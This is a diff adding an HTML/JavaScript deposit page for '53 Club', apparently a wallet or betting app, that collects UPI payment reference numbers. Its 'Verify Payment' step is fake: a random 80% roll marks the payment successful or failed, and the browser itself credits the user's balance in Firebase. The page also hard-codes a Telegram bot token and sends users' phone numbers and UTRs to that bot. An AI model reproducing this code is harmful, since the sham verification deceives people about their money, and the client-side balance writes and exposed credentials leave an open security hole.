@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>53 Club - Payment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --primary: #6a11cb;
+            --secondary: #4a6bff;
+            --dark: #121212;
+            --light: #f8f9fa;
+            --gray: #6c757d;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+            --info: #17a2b8;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--dark), #1a1a1a);
+            color: var(--light);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .back-btn {
+            color: var(--light);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .back-btn i {
+            margin-right: 5px;
+        }
+        
+        .payment-container {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .payment-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .payment-title i {
+            margin-right: 10px;
+            color: var(--secondary);
+        }
+        
+        .payment-amount {
+            font-size: 1.8rem;
+            font-weight: 700;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--secondary);
+        }
+        
+        .timer {
+            text-align: center;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            color: var(--warning);
+        }
+        
+        .qr-code {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .qr-code img {
+            width: 200px;
+            height: 200px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 10px;
+            background: white;
+        }
+        
+        .upi-details {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .upi-id {
+            font-size: 1.1rem;
+            font-weight: 500;
+            margin-bottom: 10px;
+            word-break: break-all;
+        }
+        
+        .payment-apps {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .payment-app {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .payment-app img {
+            width: 30px;
+            height: 30px;
+            object-fit: contain;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: var(--light);
+            font-size: 1rem;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--secondary);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .submit-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .submit-btn:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--success);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            animation: toastFadeIn 0.3s ease, toastFadeOut 0.3s ease 2.7s forwards;
+        }
+        
+        @keyframes toastFadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+        
+        @keyframes toastFadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+        
+        .toast.error {
+            background-color: var(--danger);
+        }
+        
+        .toast.warning {
+            background-color: var(--warning);
+            color: var(--dark);
+        }
+        
+        .toast.info {
+            background-color: var(--info);
+        }
+        
+        .toast-icon {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .instructions {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 0.9rem;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+            margin-top: 10px;
+        }
+        
+        .instructions li {
+            margin-bottom: 8px;
+        }
+        
+        .reminder {
+            background: rgba(255, 248, 225, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .reminder strong {
+            color: var(--light);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="wallet.html" class="back-btn">
+                <i class="fas fa-arrow-left"></i> Back
+            </a>
+            
+            <div class="logo">53 Club</div>
+            
+            <div style="width: 60px;"></div>
+        </header>
+        
+        <div class="payment-container">
+            <div class="payment-card">
+                <h3 class="payment-title"><i class="fas fa-qrcode"></i> Complete Payment</h3>
+                
+                <div class="payment-amount" id="payment-amount">₹0.00</div>
+                
+                <div class="timer" id="timer">Time remaining: 05:00</div>
+                
+                <div class="qr-code">
+                    <img src="https://i.ibb.co/Q3cMkBsX/Navi-QR-AMAN-16062025221135723.png" alt="Payment QR Code">
+                    <p>Scan this QR code to make payment</p>
+                </div>
+                
+                <div class="upi-details">
+                    <div class="upi-id">UPI ID: <span id="upi-id">nasir****@airtel</span></div>
+                    <button class="submit-btn" onclick="copyUPI()" style="margin-top: 10px;">
+                        <i class="far fa-copy"></i> Copy UPI ID
+                    </button>
+                </div>
+                
+                <div class="payment-apps">
+                    <div class="payment-app" onclick="openPaymentApp('gpay')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Google_Pay_%28GPay%29_Logo_%282018-2020%29.svg/1200px-Google_Pay_%28GPay%29_Logo_%282018-2020%29.svg.png" alt="Google Pay">
+                    </div>
+                    <div class="payment-app" onclick="openPaymentApp('phonepe')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/PhonePe_Logo.svg/1200px-PhonePe_Logo.svg.png" alt="PhonePe">
+                    </div>
+                    <div class="payment-app" onclick="openPaymentApp('paytm')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Paytm_logo.png/800px-Paytm_logo.png" alt="Paytm">
+                    </div>
+                    <div class="payment-app" onclick="openPaymentApp('bhim')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/BHIM_Logo.svg/1200px-BHIM_Logo.svg.png" alt="BHIM">
+                    </div>
+                </div>
+                
+                <div class="reminder">
+                    <strong>Reminder:</strong>
+                    <p>1. Saving QR codes or UPI payments and modifying order amount payments are all illegal operations! Don't save payments!</p>
+                    <p>2. Please pay to the UPI copied above within the specified time, otherwise the order may not be successful and you will need to bear the loss yourself.</p>
+                    <p>3. After paying from the following payment option: PayTM, PhonePE, GooglePay, BHIM, etc.</p>
+                    <p>4. Each tracking order is provided with a UPI certificate.</p>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Enter 12-digit UTR/Reference Number</label>
+                    <input type="text" class="form-control" id="utr-number" placeholder="Enter UTR number" maxlength="12">
+                </div>
+                
+                <button class="submit-btn" id="submit-btn" onclick="submitPayment()">
+                    Verify Payment
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyC5JqJPbyUw-rZgFp67nc0f5svWcoNt5D4",
+            authDomain: "club-b8f03.firebaseapp.com",
+            databaseURL: "https://club-b8f03-default-rtdb.firebaseio.com",
+            projectId: "club-b8f03",
+            storageBucket: "club-b8f03.firebasestorage.app",
+            messagingSenderId: "115909846985",
+            appId: "1:115909846985:web:6f42fbb224935c513cea18",
+            measurementId: "G-S3M36PLB9Y"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Telegram bot details
+        const TELEGRAM_BOT_TOKEN = '7645796543:AAEh8jLyrcaUN6Em8GFCM0fZz17hsUFRXkQ';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your actual chat ID
+        
+        // Get parameters from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const transactionId = urlParams.get('txn');
+        const amount = parseInt(urlParams.get('amount'));
+        const userPhone = urlParams.get('phone');
+        
+        // Set payment amount
+        document.getElementById('payment-amount').textContent = `₹${amount.toLocaleString('en-IN')}`;
+        
+        // Start countdown timer (5 minutes)
+        let timeLeft = 300; // 5 minutes in seconds
+        const timerElement = document.getElementById('timer');
+        
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            
+            if(timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerElement.textContent = "Time expired! Please restart payment.";
+                timerElement.style.color = "var(--danger)";
+                document.getElementById('submit-btn').disabled = true;
+                
+                // Update transaction status in Firebase
+                database.ref('deposits/' + userPhone + '/' + transactionId + '/status').set('expired');
+                
+                // Create notification
+                createNotification(
+                    'Payment Expired',
+                    `Your payment of ₹${amount} has expired. Please initiate a new payment.`,
+                    'failed'
+                );
+            } else {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `Time remaining: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }
+        }, 1000);
+        
+        // Copy UPI ID
+        function copyUPI() {
+            const upiId = document.getElementById('upi-id').textContent;
+            navigator.clipboard.writeText(upiId).then(() => {
+                showToast('UPI ID copied to clipboard!', 'success');
+            });
+        }
+        
+        // Open payment app
+        function openPaymentApp(app) {
+            let url;
+            const upiId = 'nasir****@airtel';
+            const amount = document.getElementById('payment-amount').textContent.replace('₹', '');
+            
+            switch(app) {
+                case 'gpay':
+                    url = `tez://upi/pay?pa=${upiId}&pn=53Club&am=${amount}&cu=INR`;
+                    break;
+                case 'phonepe':
+                    url = `phonepe://upi/pay?pa=${upiId}&pn=53Club&am=${amount}&cu=INR`;
+                    break;
+                case 'paytm':
+                    url = `paytmmp://upi/pay?pa=${upiId}&pn=53Club&am=${amount}&cu=INR`;
+                    break;
+                case 'bhim':
+                    url = `bhim://upi/pay?pa=${upiId}&pn=53Club&am=${amount}&cu=INR`;
+                    break;
+                default:
+                    return;
+            }
+            
+            window.location.href = url;
+            
+            // Fallback if app not installed
+            setTimeout(() => {
+                if(document.hidden) return;
+                window.location.href = `https://upayi.vercel.app/pay?pa=${upiId}&pn=53Club&am=${amount}&cu=INR`;
+            }, 500);
+        }
+        
+        // Submit payment details
+        function submitPayment() {
+            const utrNumber = document.getElementById('utr-number').value.trim();
+            
+            if(!utrNumber || utrNumber.length !== 12) {
+                showToast('Please enter a valid 12-digit UTR number', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('submit-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Verifying...';
+            
+            // Update transaction in Firebase
+            database.ref('deposits/' + userPhone + '/' + transactionId).update({
+                utr: utrNumber,
+                status: 'processing'
+            })
+            .then(() => {
+                // Send UTR to Telegram bot
+                sendToTelegram(utrNumber, amount, userPhone);
+                
+                // Simulate verification (in real app, this would verify with payment gateway)
+                setTimeout(() => {
+                    // 80% chance of success
+                    const isSuccess = Math.random() > 0.2;
+                    
+                    if(isSuccess) {
+                        // Update transaction status
+                        database.ref('deposits/' + userPhone + '/' + transactionId + '/status').set('success');
+                        
+                        // Update user balance
+                        database.ref('users/' + userPhone + '/balance').transaction((currentBalance) => {
+                            return (currentBalance || 0) + amount;
+                        });
+                        
+                        // Create success notification
+                        createNotification(
+                            'Payment Successful',
+                            `Your payment of ₹${amount} has been successfully processed. UTR: ${utrNumber}`,
+                            'success'
+                        );
+                        
+                        showToast('Payment verified successfully!', 'success');
+                        
+                        // Redirect back to wallet after delay
+                        setTimeout(() => {
+                            window.location.href = 'wallet.html';
+                        }, 1500);
+                    } else {
+                        // Update transaction status
+                        database.ref('deposits/' + userPhone + '/' + transactionId + '/status').set('failed');
+                        
+                        // Create failed notification
+                        createNotification(
+                            'Payment Failed',
+                            `Your payment of ₹${amount} failed verification. Please contact support. UTR: ${utrNumber}`,
+                            'failed'
+                        );
+                        
+                        showToast('Payment verification failed. Please contact support.', 'error');
+                        btn.disabled = false;
+                        btn.textContent = 'Verify Payment';
+                    }
+                }, 2000);
+            })
+            .catch((error) => {
+                console.error('Error updating transaction:', error);
+                showToast('Error processing payment. Please try again.', 'error');
+                btn.disabled = false;
+                btn.textContent = 'Verify Payment';
+            });
+        }
+        
+        // Create notification
+        function createNotification(title, message, type) {
+            const notificationId = 'NOT' + Date.now();
+            
+            database.ref('notifications/' + userPhone + '/' + notificationId).set({
+                title: title,
+                message: message,
+                type: type,
+                timestamp: Date.now(),
+                read: false
+            });
+        }
+        
+        // Send UTR to Telegram bot
+        function sendToTelegram(utr, amount, phone) {
+            const message = `New Payment Received\n\n` +
+                           `Amount: ₹${amount}\n` +
+                           `UTR: ${utr}\n` +
+                           `User: ${phone}\n` +
+                           `Transaction ID: ${transactionId}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+        
+        // Show toast notification
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <span class="toast-icon">${type === 'success' ? '✓' : type === 'error' ? '✗' : type === 'warning' ? '⚠' : 'i'}</span>
+                ${message}
+            `;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
